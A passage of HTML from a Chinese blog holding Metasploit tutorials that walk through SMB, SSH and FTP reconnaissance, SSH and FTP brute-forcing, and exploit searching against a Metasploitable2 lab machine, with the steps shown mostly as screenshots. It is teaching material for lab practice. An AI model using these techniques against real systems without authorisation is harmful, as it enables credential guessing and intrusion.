<h4 id="3-1-使用smb-version基于SMB协议扫描操作系统版本号"><a href="#3-1-使用smb-version基于SMB协议扫描操作系统版本号" class="headerlink" title="3.1 使用smb_version基于SMB协议扫描操作系统版本号"></a>3.1 使用smb_version基于SMB协议扫描操作系统版本号</h4><p>步骤1：查看和加载smb_version模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815151714448.png" alt="image-20210815151714448"></p>
<p>步骤2：查看模块信息并配置/修改的参数</p>
<p>说明：靶机的ip按照实际来，且靶机需要启动才可以扫描到</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815151951012.png" alt="image-20210815151951012"></p>
<p>步骤3：启动和查看结果</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815152109126.png" alt="image-20210815152109126"></p>
<h4 id="3-2-使用smb-enumshares基于SMB协议扫描共享文件"><a href="#3-2-使用smb-enumshares基于SMB协议扫描共享文件" class="headerlink" title="3.2 使用smb_enumshares基于SMB协议扫描共享文件"></a>3.2 使用smb_enumshares基于SMB协议扫描共享文件</h4><p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815152342653.png" alt="image-20210815152342653"></p>
<p>环境条件：</p>
<p>1.需要知道靶机用户的账号密码且目标机需要有共享文件</p>
<p>2.靶机文件开启共享属性</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815152552596.png" alt="image-20210815152552596"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815152628596.png" alt="image-20210815152628596"></p>
<p>步骤1：查看和加载smb_enumshares模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815152800832.png" alt="image-20210815152800832"></p>
<p>步骤2：查看模块信息并配置/修改的参数</p>
<p>补充：需要知道账号和密码</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815152907507.png" alt="image-20210815152907507"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815153002291.png" alt="image-20210815153002291"></p>
<p>步骤3：启动和查看结果</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815153110188.png" alt="image-20210815153110188"></p>
<h4 id="3-3-使用smb-lookupsid扫描系统用户信息（SID枚举）"><a href="#3-3-使用smb-lookupsid扫描系统用户信息（SID枚举）" class="headerlink" title="3.3 使用smb_lookupsid扫描系统用户信息（SID枚举）"></a>3.3 使用smb_lookupsid扫描系统用户信息（SID枚举）</h4><p>环境条件：</p>
<p>1.需要知道靶机用户的账号密码</p>
<p>这里新建一个用户，帮助更好查看效果</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815153514242.png" alt="image-20210815153514242"></p>
<p>步骤1：查看和加载smb_enumshares模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815153615986.png" alt="image-20210815153615986"></p>
<p>步骤2：查看模块信息并配置/修改的参数</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815153703105.png" alt="image-20210815153703105"></p>
<p>如果没有账号密码则扫描不了扫描信息，如下：</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815153742787.png" alt="image-20210815153742787"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815153812262.png" alt="image-20210815153812262"></p>
<p>步骤3：启动和查看结果</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815153928366.png" alt="image-20210815153928366"></p>
<h2 id="四、基于SSH协议收集信息"><a href="#四、基于SSH协议收集信息" class="headerlink" title="四、基于SSH协议收集信息"></a>四、基于SSH协议收集信息</h2><h4 id="4-1-查看ssh服务的版本信息"><a href="#4-1-查看ssh服务的版本信息" class="headerlink" title="4.1 查看ssh服务的版本信息"></a>4.1 查看ssh服务的版本信息</h4><h4 id><a href="#" class="headerlink" title></a><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815164301785.png" alt="image-20210815164301785"></h4><p>4.2 对SSH暴力破解</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815164512963.png" alt="image-20210815164512963"></p>
<p>补充：</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815164814906.png" alt="image-20210815164814906"></p>
<p>查看/进入会话</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210815164941748.png" alt="image-20210815164941748"></p>
<h2 id="五、基于FTP协议收集信息"><a href="#五、基于FTP协议收集信息" class="headerlink" title="五、基于FTP协议收集信息"></a>五、基于FTP协议收集信息</h2><h4 id="5-1-查看ftp服务器版本信息"><a href="#5-1-查看ftp服务器版本信息" class="headerlink" title="5.1 查看ftp服务器版本信息"></a>5.1 查看ftp服务器版本信息</h4><p>说明：了解了版本信息，就可以查找对应版本漏洞</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816095151966.png" alt="image-20210816095151966"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816095044193.png" alt="image-20210816095044193"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816095056282.png" alt="image-20210816095056282"></p>
<h4 id="利用版本号寻找相关漏洞"><a href="#利用版本号寻找相关漏洞" class="headerlink" title="利用版本号寻找相关漏洞"></a>利用版本号寻找相关漏洞</h4><p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816095449106.png" alt="image-20210816095449106"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816095618467.png" alt="image-20210816095618467"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816095742283.png" alt="image-20210816095742283"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816095815770.png" alt="image-20210816095815770"></p>
<h4 id="5-2-FTP匿名登录"><a href="#5-2-FTP匿名登录" class="headerlink" title="5.2 FTP匿名登录"></a>5.2 FTP匿名登录</h4><p>匿名：anonymous</p>
<p>步骤1：寻找模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816095957022.png" alt="image-20210816095957022"></p>
<p>步骤2：加载模块、查看并设置参数</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816100114694.png" alt="image-20210816100114694"></p>
<p>步骤3：启动</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816100304444.png" alt="image-20210816100304444"></p>
<p>步骤4：使用ftp客户端登录</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816100447302.png" alt="image-20210816100447302"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816100532399.png" alt="image-20210816100532399"></p>
<h4 id="5-3-FTP暴力破解"><a href="#5-3-FTP暴力破解" class="headerlink" title="5.3 FTP暴力破解"></a>5.3 FTP暴力破解</h4><p>步骤1：查找并加载模块</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816100736134.png" alt="image-20210816100736134"></p>
<p>步骤2：查看并设置参数</p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816100842630.png" alt="image-20210816100842630"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816101002946.png" alt="image-20210816101002946"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816100904140.png" alt="image-20210816100904140"></p>
<p><img src="/2021/08/16/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210816101058890.png" alt="image-20210816101058890"></p>
<p>补充：这里的字典和上面那个暴力破解字典是一样的，注意路径（可能与这里写的不一）且字典是加入了msfadmin（因为默认的字典里没有，手动加入正确的账号密码来方便演示）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">Metasploit渗透测试框架的基本使用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-15 09:53:47 / 修改时间：09:54:32" itemprop="dateCreated datePublished" datetime="2021-08-15T09:53:47+08:00">2021-08-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Metasploit渗透测试框架的基本使用"><a href="#Metasploit渗透测试框架的基本使用" class="headerlink" title="Metasploit渗透测试框架的基本使用"></a>Metasploit渗透测试框架的基本使用</h1><h2 id="一、Metasploit渗透测试框架"><a href="#一、Metasploit渗透测试框架" class="headerlink" title="一、Metasploit渗透测试框架"></a>一、Metasploit渗透测试框架</h2><h3 id="1-0介绍"><a href="#1-0介绍" class="headerlink" title="1.0介绍"></a>1.0介绍</h3><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210804203643227.png" alt="image-20210804203643227"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210804203711396.png" alt="image-20210804203711396"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210804203726608.png" alt="image-20210804203726608"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210804203742693.png" alt="image-20210804203742693"></p>
<h4 id="1-1Metasploit体系架构"><a href="#1-1Metasploit体系架构" class="headerlink" title="1.1Metasploit体系架构"></a>1.1Metasploit体系架构</h4><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210804203758466.png" alt="image-20210804203758466"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210804203905509.png" alt="image-20210804203905509"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210804203934088.png" alt="image-20210804203934088"></p>
<h2 id="二、Metasploit2-Linux靶机"><a href="#二、Metasploit2-Linux靶机" class="headerlink" title="二、Metasploit2-Linux靶机"></a>二、Metasploit2-Linux靶机</h2><h4 id="2-0Metasploit2靶机介绍"><a href="#2-0Metasploit2靶机介绍" class="headerlink" title="2.0Metasploit2靶机介绍"></a>2.0Metasploit2靶机介绍</h4><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805095327436.png" alt="image-20210805095327436"></p>
<p>2.1搭建</p>
<p>下载好Metasploit2-Linux-2.0.0压缩包，解压后获得以下文件</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805102426867.png" alt="image-20210805102426867"></p>
<p>打开虚拟机（这里虚拟机网络设置了桥接模式）</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805151145363.png" alt="image-20210805151145363"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805095503163.png" alt="image-20210805095503163"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805095525081.png" alt="image-20210805095525081"></p>
<p>配置网络</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805102551986.png" alt="image-20210805102551986"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806165223429.png" alt="image-20210806165223429"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805152049233.png" alt="image-20210805152049233"></p>
<h2 id="三、Metasploit基本使用方法"><a href="#三、Metasploit基本使用方法" class="headerlink" title="三、Metasploit基本使用方法"></a>三、Metasploit基本使用方法</h2><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805164029799.png" alt="image-20210805164029799"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805164155781.png" alt="image-20210805164155781"></p>
<p>补充：在kali中启示</p>
<h4 id="3-1启动Metasploit"><a href="#3-1启动Metasploit" class="headerlink" title="3.1启动Metasploit"></a>3.1启动Metasploit</h4><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805164342101.png" alt="image-20210805164342101"></p>
<p>需要先启动postgresql数据库（不启动也会提示）</p>
<p>也可以在终端输入以下指令启动</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805164509235.png" alt="image-20210805164509235"></p>
<p>启动成功</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805164557539.png" alt="image-20210805164557539"></p>
<h4 id="3-2命令介绍"><a href="#3-2命令介绍" class="headerlink" title="3.2命令介绍"></a>3.2命令介绍</h4><p>输入help可以查看说明/模块</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805164858639.png" alt="image-20210805164858639"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805165823481.png" alt="image-20210805165642839"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805165357259.png" alt="image-20210805165357259"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805165510043.png" alt="image-20210805165510043"></p>
<p>目标：可以是网关/域名等等</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805165854584.png" alt="image-20210805165854584"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170001703.png" alt="image-20210805170001703"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170151441.png" alt="image-20210805170151441"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170226802.png" alt="image-20210805170226802"></p>
<h4 id="3-2-1search使用方法介绍"><a href="#3-2-1search使用方法介绍" class="headerlink" title="3.2.1search使用方法介绍"></a>3.2.1search使用方法介绍</h4><p>a.name</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170330750.png" alt="image-20210805170330750"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170407806.png" alt="image-20210805170407806"></p>
<p>补充：关键字可以是漏洞名称、软件、系统等等</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170518118.png" alt="image-20210805170518118"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170528473.png" alt="image-20210805170528473"></p>
<p>b.通过路径查找</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170558678.png" alt="image-20210805170558678"></p>
<p>c.缩写范围查找</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170639892.png" alt="image-20210805170639892"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170715597.png" alt="image-20210805170715597"></p>
<p>d.通过类型查找</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170738352.png" alt="image-20210805170738352"></p>
<p>e.联合查找</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170804263.png" alt="image-20210805170804263"></p>
<p>f.根据CVE搜索漏洞模块</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171149293.png" alt="image-20210805171149293"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171210638.png" alt="image-20210805171210638"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171245881.png" alt="image-20210805171245881"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171321553.png" alt="image-20210805171321553"></p>
<h4 id="3-3模块相关的命令use的使用方法"><a href="#3-3模块相关的命令use的使用方法" class="headerlink" title="3.3模块相关的命令use的使用方法"></a>3.3模块相关的命令use的使用方法</h4><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171340764.png" alt="image-20210805171340764"></p>
<p>步骤1：找出漏洞模块</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171433346.png" alt="image-20210805171433346"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171500575.png" alt="image-20210805171500575"></p>
<p>步骤2：装载模块</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171759100.png" alt="image-20210805171759100"></p>
<p>补充：查看漏洞模块信息</p>
<p>法1：</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171900407.png" alt="image-20210805171900407"></p>
